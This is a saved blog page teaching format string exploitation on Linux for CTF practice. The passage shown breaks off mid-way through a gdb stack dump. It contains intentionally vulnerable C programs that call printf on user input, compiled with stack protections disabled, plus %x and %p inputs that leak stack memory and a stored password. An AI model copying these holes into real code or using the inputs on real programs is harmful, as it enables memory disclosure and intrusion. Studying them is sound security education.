<!DOCTYPE html>
<!-- saved from url=(0054)https://axcheron.github.io/exploit-101-format-strings/ -->
<html lang="en" class=" js "><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    

<!-- begin _includes/seo.html --><title>Exploit 101 - Format Strings - BreakInSecurity</title>
<meta name="description" content="How to exploit format strings on Linux.">


  <meta name="author" content="Alexandre CHERON">
  
  <meta property="article:author" content="Alexandre CHERON">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="BreakInSecurity">
<meta property="og:title" content="Exploit 101 - Format Strings">
<meta property="og:url" content="https://axcheron.github.io/exploit-101-format-strings/">


  <meta property="og:description" content="How to exploit format strings on Linux.">





  <meta name="twitter:site" content="@axcheron">
  <meta name="twitter:title" content="Exploit 101 - Format Strings">
  <meta name="twitter:description" content="How to exploit format strings on Linux.">
  <meta name="twitter:url" content="https://axcheron.github.io/exploit-101-format-strings/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2018-04-22T00:00:00+00:00">





  

  


<link rel="canonical" href="https://axcheron.github.io/exploit-101-format-strings/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Alexandre CHERON",
      "url": "https://axcheron.github.io/"
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="https://axcheron.github.io/feed.xml" type="application/atom+xml" rel="alternate" title="BreakInSecurity Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="./Exploit 101 - Format Strings - BreakInSecurity_files/main.css">
<link rel="stylesheet" href="./Exploit 101 - Format Strings - BreakInSecurity_files/all.min.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  <style id="fit-vids-style">.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style></head>

  <body class="layout--single">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="https://axcheron.github.io/exploit-101-format-strings/#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="https://axcheron.github.io/exploit-101-format-strings/#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="https://axcheron.github.io/exploit-101-format-strings/#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="https://axcheron.github.io/">
          BreakInSecurity
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="https://axcheron.github.io/">Blog</a>
            </li><li class="masthead__menu-item">
              <a href="https://axcheron.github.io/projects/">Projects</a>
            </li><li class="masthead__menu-item">
              <a href="https://axcheron.github.io/writeups/">Write-Ups</a>
            </li><li class="masthead__menu-item">
              <a href="https://axcheron.github.io/trainings/">Trainings</a>
            </li><li class="masthead__menu-item">
              <a href="https://axcheron.github.io/links/">Links</a>
            </li><li class="masthead__menu-item">
              <a href="https://axcheron.github.io/about/">About</a>
            </li><li class="masthead__menu-item">
              <a href="https://axcheron.github.io/disclaimer/">Disclaimer</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button" count="0">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope="" itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="./Exploit 101 - Format Strings - BreakInSecurity_files/bio_main.jpg" alt="Alexandre CHERON" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Alexandre CHERON</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Just Another Hacker. Security Researcher. Bytes Addict. Almost Human.</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope="" itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">127.0.0.1</span>
        </li>
      

      
        
          
        
          
            <li><a href="https://axcheron.github.io/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
          
        
          
            <li><a href="https://twitter.com/axcheron" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
        
          
            <li><a href="https://github.com/axcheron" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope="" itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Exploit 101 - Format Strings">
    <meta itemprop="description" content="How to exploit format strings on Linux.">
    <meta itemprop="datePublished" content="2018-04-22T00:00:00+00:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Exploit 101 - Format Strings
</h1>
          

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          21 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content" itemprop="text">
        
        <hr>
<aside class="sidebar__right">
<nav class="toc">
    <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Format Strings</h4></header>
<ul class="toc__menu" id="markdown-toc">
  <li><a href="https://axcheron.github.io/exploit-101-format-strings/#format-strings" id="markdown-toc-format-strings">Format Strings</a></li>
  <li><a href="https://axcheron.github.io/exploit-101-format-strings/#vulnerability" id="markdown-toc-vulnerability">Vulnerability</a></li>
  <li><a href="https://axcheron.github.io/exploit-101-format-strings/#reading-the-stack" id="markdown-toc-reading-the-stack">Reading the Stack</a></li>
  <li class="active"><a href="https://axcheron.github.io/exploit-101-format-strings/#writing-to-the-stack" id="markdown-toc-writing-to-the-stack">Writing to the Stack</a></li>
  <li><a href="https://axcheron.github.io/exploit-101-format-strings/#use-cases" id="markdown-toc-use-cases">Use Cases</a>    <ul>
      <li><a href="https://axcheron.github.io/exploit-101-format-strings/#random-write" id="markdown-toc-random-write">Random Write</a></li>
      <li><a href="https://axcheron.github.io/exploit-101-format-strings/#precision-write" id="markdown-toc-precision-write">Precision Write</a></li>
      <li><a href="https://axcheron.github.io/exploit-101-format-strings/#code-execution-redirect" id="markdown-toc-code-execution-redirect">Code Execution Redirect</a></li>
    </ul>
  </li>
  <li><a href="https://axcheron.github.io/exploit-101-format-strings/#conclusion" id="markdown-toc-conclusion">Conclusion</a></li>
  <li><a href="https://axcheron.github.io/exploit-101-format-strings/#resources" id="markdown-toc-resources">Resources</a></li>
</ul>

  </nav>
</aside>
<p>I always had hard times to fully understand how to exploit <strong>Format Strings</strong> vulnerabilities. After a recent online challenge, I decided to tackle this problem and learn how to properly exploit them. Here, I’ll show you various ways to write exploits for those kind of vulerabilities and I hope it will help you for your next <a href="https://ctftime.org/">CTF</a> !</p>

<p class="notice--info"><strong>Note</strong> The examples presented in this post have been tested on a Debian with <strong>ASLR</strong> disabled. I provide the compilation arguments for <em>gcc</em> if you want to test them on your own.</p>

<p class="notice--warning"><strong>Watch out !</strong> The dynamic analysis have been done with <a href="https://github.com/longld/peda">PEDA</a> for <em>gdb</em>. The address alignment will be different outside <em>gdb</em>.</p>

<h2 id="format-strings">Format Strings<a class="header-link" href="https://axcheron.github.io/exploit-101-format-strings/#format-strings" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>A format string refers to a control parameter used by a class of functions in string-processing libraries (like <strong><em>stdio.h</em></strong>). The most known are the following, but there are many more.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">printf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="p">...)</span>
<span class="kt">int</span> <span class="n">fprintf</span><span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="p">...)</span>
<span class="kt">int</span> <span class="n">sprintf</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="p">...)</span>
<span class="kt">int</span> <span class="n">vprintf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">arg</span><span class="p">)</span>
<span class="kt">int</span> <span class="n">vsprintf</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">arg</span><span class="p">)</span>
</code></pre></div></div>

<p>The format string specifies a method for rendering data type parameters into a string. This string is then, by default, printed on the <em>standard output</em>.</p>

<p>For example, the C library function <code class="language-plaintext highlighter-rouge">int printf(const char *format, ...)</code> sends formatted output to <em>stdout</em>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">printf</span><span class="p">(</span><span class="s">"Color %s, number1 %d, number2 %05d, hex %#x, float %5.2f, unsigned value %u.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
       <span class="s">"red"</span><span class="p">,</span> <span class="mi">123456</span><span class="p">,</span> <span class="mi">89</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">3</span><span class="p">.</span><span class="mi">14159</span><span class="p">,</span> <span class="mi">250</span><span class="p">);</span>

<span class="c1">// It will print the following line</span>
<span class="n">Color</span> <span class="n">red</span><span class="p">,</span> <span class="n">number1</span> <span class="mi">123456</span><span class="p">,</span> <span class="n">number2</span> <span class="mo">000</span><span class="mi">89</span><span class="p">,</span> <span class="n">hex</span> <span class="mh">0xff</span><span class="p">,</span> <span class="kt">float</span>  <span class="mi">3</span><span class="p">.</span><span class="mi">14</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">value</span> <span class="mi">250</span><span class="p">.</span>
</code></pre></div></div>

<p>As you can see, if <strong>format</strong> includes a <em>format specifiers</em> (beginning with <strong>%</strong>), the additional arguments following <strong>format</strong> are formatted and inserted in the resulting string by replacing them with their respective <em>specifiers</em>. There are many <em>specifiers</em>, including :</p>

<table>
  <thead>
    <tr>
      <th>Specifiers</th>
      <th>Output</th>
      <th>Example</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>d</td>
      <td>Signed decimal integer</td>
      <td>392</td>
    </tr>
    <tr>
      <td>u</td>
      <td>Unsigned decimal integer</td>
      <td>7235</td>
    </tr>
    <tr>
      <td>o</td>
      <td>Unsigned octal</td>
      <td>610</td>
    </tr>
    <tr>
      <td>x</td>
      <td>Unsigned hexadecimal integer</td>
      <td>7fa</td>
    </tr>
    <tr>
      <td>f</td>
      <td>Decimal floating point</td>
      <td>392.65</td>
    </tr>
    <tr>
      <td>c</td>
      <td>Character</td>
      <td>a</td>
    </tr>
    <tr>
      <td>s</td>
      <td>String of characters</td>
      <td>sample</td>
    </tr>
    <tr>
      <td>p</td>
      <td>Pointer address</td>
      <td>b8000000</td>
    </tr>
    <tr>
      <td>n</td>
      <td>Nothing printed (will be explained later)</td>
      <td>&nbsp;</td>
    </tr>
  </tbody>
</table>

<p>Here is how a normal <em>printf()</em> call looks like on the stack :</p>

<p><img src="./Exploit 101 - Format Strings - BreakInSecurity_files/normal_printf.svg" alt="image-center" class="align-center" width="500px"></p>

<h2 id="vulnerability">Vulnerability<a class="header-link" href="https://axcheron.github.io/exploit-101-format-strings/#vulnerability" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>The format string vulnerability can be used to <strong>read</strong> or <strong>write</strong> memory and/or <strong>execute</strong> harmful code. The problem lies into the use of <em>unchecked</em> user input as the format string parameter that perform formatting. A malicious user may use the <strong>%s</strong> or <strong>%x</strong> format specifier, among others, to print data from the stack or other locations in memory. You can also write arbitrary data to arbitrary locations using the <strong>%n</strong> format specifier, but we will see that later.</p>

<p>Here is what happens on the stack when you don’t write any format specifiers when calling <em>printf()</em> :</p>

<p><img src="./Exploit 101 - Format Strings - BreakInSecurity_files/error_printf.svg" alt="image-center" class="align-center" width="500px"></p>

<p>Let me show you an example :</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>

    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="n">strncpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">50</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Here, <em>printf()</em> does not contain any specifiers…</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./demo1 blah
blah

<span class="nv">$ </span>./demo1 %x.%x.%x
bfb6c8b3.32.47a5d7

<span class="nv">$ </span>./demo1 %08x.%08x.%08x
bfea28ad.00000032.004665d7
</code></pre></div></div>

<p>The <strong>%x</strong> specifiers is stored in <strong>buffer</strong> and interpreted by the <em>printf()</em> function resulting in reading data from the stack. For each <strong>%x</strong>, <em>printf()</em> will fetch a number from the stack, treat this number as an address, and print out the memory contents pointed by this address as a string.</p>

<p>Enough for the theory, let’s do some practice !</p>

<h2 id="reading-the-stack">Reading the Stack<a class="header-link" href="https://axcheron.github.io/exploit-101-format-strings/#reading-the-stack" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>For the first demonstration, we’ll try to read a password from the stack.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
</span>
<span class="c1">// gcc -z execstack -z norelro -fno-stack-protector -o format0 format0.c</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">pass</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="s">"AABBCCDD"</span><span class="p">;</span>
    <span class="kt">int</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">pass</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>

    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="n">buf</span><span class="p">[</span><span class="n">strcspn</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span> 

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="n">pass</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pass</span><span class="p">))){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Greetings!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">" does not have access!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Here, we would like to read the <em>*ptr</em> variable as it contains the password. First, let’s run the executable.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@gdb:~<span class="nv">$ </span>./format0
%p
0xbffff67e does not have access!
</code></pre></div></div>

<p>Here, the <strong>%p</strong> prints the first argument <em>printf()</em> will find on the stack. Let’s take a look at the stack before calling <em>printf()</em>.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">[-------------------------------------</span><span class="nf">code</span><span class="o">-------------------------------------</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x400737</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">167</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="err">0</span><span class="nf">x40073a</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">170</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x7a</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x40073d</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">173</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">eax</span>
<span class="err">=&gt;</span> <span class="err">0</span><span class="nf">x40073e</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">174</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x4004a0</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x400743</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">179</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="err">0</span><span class="nf">x400746</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">182</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="err">0</span><span class="nf">x400749</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">185</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebx</span><span class="o">-</span><span class="mh">0x1257</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x40074f</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">191</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">eax</span>
<span class="nf">Guessed</span> <span class="nv">arguments</span><span class="p">:</span>
<span class="nf">arg</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mh">0xbffff63e</span> <span class="o">--&gt;</span> <span class="mh">0x7025</span> <span class="p">(</span><span class="s">'%p'</span><span class="p">)</span>
<span class="err">[------------------------------------</span><span class="nf">stack</span><span class="o">-------------------------------------</span><span class="p">]</span>
<span class="err">0000|</span> <span class="err">0</span><span class="nf">xbffff620</span> <span class="o">--&gt;</span> <span class="mh">0xbffff63e</span> <span class="o">--&gt;</span> <span class="mh">0x7025</span> <span class="p">(</span><span class="s">'%p'</span><span class="p">)</span>
<span class="err">0004|</span> <span class="err">0</span><span class="nf">xbffff624</span> <span class="o">--&gt;</span> <span class="mh">0xbffff63e</span> <span class="o">--&gt;</span> <span class="mh">0x7025</span> <span class="p">(</span><span class="s">'%p'</span><span class="p">)</span>
<span class="err">0008|</span> <span class="err">0</span><span class="nf">xbffff628</span> <span class="o">--&gt;</span> <span class="mh">0xa</span> <span class="p">(</span><span class="err">'\</span><span class="nv">n</span><span class="err">'</span><span class="p">)</span>
<span class="err">0012|</span> <span class="err">0</span><span class="nf">xbffff62c</span> <span class="o">--&gt;</span> <span class="mh">0x4006a7</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">23</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">ebx</span><span class="p">,</span><span class="mh">0x13ad</span><span class="p">)</span>
<span class="err">0016|</span> <span class="err">0</span><span class="nf">xbffff630</span> <span class="o">--&gt;</span> <span class="mh">0xbffff65e</span> <span class="o">--&gt;</span> <span class="mh">0x40</span> <span class="p">(</span><span class="s">'@'</span><span class="p">)</span>
<span class="err">0020|</span> <span class="err">0</span><span class="nf">xbffff634</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">0024|</span> <span class="err">0</span><span class="nf">xbffff638</span> <span class="o">--&gt;</span> <span class="mh">0xb7fe5100</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">_dl_lookup_symbol_x</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">edi</span><span class="p">,</span><span class="mh">0x19f00</span><span class="p">)</span>
<span class="err">0028|</span> <span class="err">0</span><span class="nf">xbffff63c</span> <span class="o">--&gt;</span> <span class="mh">0x7025fc10</span> 
<span class="err">[------------------------------------------------------------------------------]</span>
<span class="nl">Legend:</span> <span class="nf">code</span><span class="p">,</span> <span class="nv">data</span><span class="p">,</span> <span class="nv">rodata</span><span class="p">,</span> <span class="nv">value</span>

<span class="nf">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x0040073e</span> <span class="nv">in</span> <span class="nv">main</span> <span class="p">()</span>
</code></pre></div></div>

<p>The first argument on the stack is the format is the format specifier and the second, our string which is also the format specifiers as it is our input string. So, <strong>%p</strong> will print the pointer to our string : <strong>0xbffff63e</strong>.</p>

<p>Now, what if we want to print the pointer to the password ? Well, in a format specifier, you can select a specific argument to print like, <code class="language-plaintext highlighter-rouge">printf("%2$x", 1, 2, 3)</code> will print 2.</p>

<p>So, we just need to know were is the pointer to the password on the stack and input <code class="language-plaintext highlighter-rouge">%&lt;num&gt;$s</code>. Here I use <strong>%s</strong> as we want to print the <strong>string</strong>, not the pointer. Here is the stack…</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">[------------------------------------</span><span class="nf">stack</span><span class="o">-------------------------------------</span><span class="p">]</span>
<span class="err">0000|</span> <span class="err">0</span><span class="nf">xbffff620</span> <span class="o">--&gt;</span> <span class="mh">0xbffff63e</span> <span class="o">--&gt;</span> <span class="mh">0x7025</span> <span class="p">(</span><span class="s">'%p'</span><span class="p">)</span>
<span class="err">0004|</span> <span class="err">0</span><span class="nf">xbffff624</span> <span class="o">--&gt;</span> <span class="mh">0xbffff63e</span> <span class="o">--&gt;</span> <span class="mh">0x7025</span> <span class="p">(</span><span class="s">'%p'</span><span class="p">)</span>
<span class="err">0008|</span> <span class="err">0</span><span class="nf">xbffff628</span> <span class="o">--&gt;</span> <span class="mh">0xa</span> <span class="p">(</span><span class="err">'\</span><span class="nv">n</span><span class="err">'</span><span class="p">)</span>
<span class="err">0012|</span> <span class="err">0</span><span class="nf">xbffff62c</span> <span class="o">--&gt;</span> <span class="mh">0x4006a7</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">23</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">ebx</span><span class="p">,</span><span class="mh">0x13ad</span><span class="p">)</span>
<span class="err">0016|</span> <span class="err">0</span><span class="nf">xbffff630</span> <span class="o">--&gt;</span> <span class="mh">0xbffff65e</span> <span class="o">--&gt;</span> <span class="mh">0x40</span> <span class="p">(</span><span class="s">'@'</span><span class="p">)</span>
<span class="err">0020|</span> <span class="err">0</span><span class="nf">xbffff634</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">0024|</span> <span class="err">0</span><span class="nf">xbffff638</span> <span class="o">--&gt;</span> <span class="mh">0xb7fe5100</span> <span class="p">(</span><span class="o">&lt;</span><span class="nv">_dl_lookup_symbol_x</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">edi</span><span class="p">,</span><span class="mh">0x19f00</span><span class="p">)</span>
<span class="err">0028|</span> <span class="err">0</span><span class="nf">xbffff63c</span> <span class="o">--&gt;</span> <span class="mh">0x7025fc10</span> 
<span class="err">0032|</span> <span class="err">0</span><span class="nf">xbffff640</span> <span class="o">--&gt;</span> <span class="mh">0xbfff0000</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">0036|</span> <span class="err">0</span><span class="nf">xbffff644</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">0040|</span> <span class="err">0</span><span class="nf">xbffff648</span> <span class="o">--&gt;</span> <span class="mh">0xc10000</span> 
<span class="err">0044|</span> <span class="err">0</span><span class="nf">xbffff64c</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">0048|</span> <span class="err">0</span><span class="nf">xbffff650</span> <span class="o">--&gt;</span> <span class="mh">0xb7fff000</span> <span class="o">--&gt;</span> <span class="mh">0x23f40</span> 
<span class="err">0052|</span> <span class="err">0</span><span class="nf">xbffff654</span> <span class="o">--&gt;</span> <span class="mh">0xb7fff920</span> <span class="o">--&gt;</span> <span class="mh">0x400000</span> <span class="o">--&gt;</span> <span class="mh">0x464c457f</span> 
<span class="err">0056|</span> <span class="err">0</span><span class="nf">xbffff658</span> <span class="o">--&gt;</span> <span class="mh">0xbffff670</span> <span class="o">--&gt;</span> <span class="mh">0xffffffff</span> 
<span class="err">0060|</span> <span class="err">0</span><span class="nf">xbffff65c</span> <span class="o">--&gt;</span> <span class="mh">0x400306</span> <span class="p">(</span><span class="err">"</span><span class="nv">__libc_start_main</span><span class="err">"</span><span class="p">)</span>
<span class="err">0064|</span> <span class="err">0</span><span class="nf">xbffff660</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="err">0068|</span> <span class="err">0</span><span class="nf">xbffff664</span> <span class="o">--&gt;</span> <span class="mh">0xbffff704</span> <span class="o">--&gt;</span> <span class="mh">0xf28a634d</span> 
<span class="err">0072|</span> <span class="err">0</span><span class="nf">xbffff668</span> <span class="o">--&gt;</span> <span class="mh">0xb7fcb000</span> <span class="o">--&gt;</span> <span class="mh">0x1b2db0</span> 
<span class="err">0076|</span> <span class="err">0</span><span class="nf">xbffff66c</span> <span class="o">--&gt;</span> <span class="mh">0xd</span> <span class="p">(</span><span class="err">'\</span><span class="nv">r</span><span class="err">'</span><span class="p">)</span>
<span class="err">0080|</span> <span class="err">0</span><span class="nf">xbffff670</span> <span class="o">--&gt;</span> <span class="mh">0xffffffff</span> 
<span class="err">0084|</span> <span class="err">0</span><span class="nf">xbffff674</span> <span class="o">--&gt;</span> <span class="mh">0xb7fcb000</span> <span class="o">--&gt;</span> <span class="mh">0x1b2db0</span> 
<span class="err">0088|</span> <span class="err">0</span><span class="nf">xbffff678</span> <span class="o">--&gt;</span> <span class="mh">0xb7e24e18</span> <span class="o">--&gt;</span> <span class="mh">0x2bb6</span> 
<span class="err">0092|</span> <span class="err">0</span><span class="nf">xbffff67c</span> <span class="o">--&gt;</span> <span class="mh">0xb7fd5858</span> <span class="o">--&gt;</span> <span class="mh">0xb7e18000</span> <span class="o">--&gt;</span> <span class="mh">0x464c457f</span> 
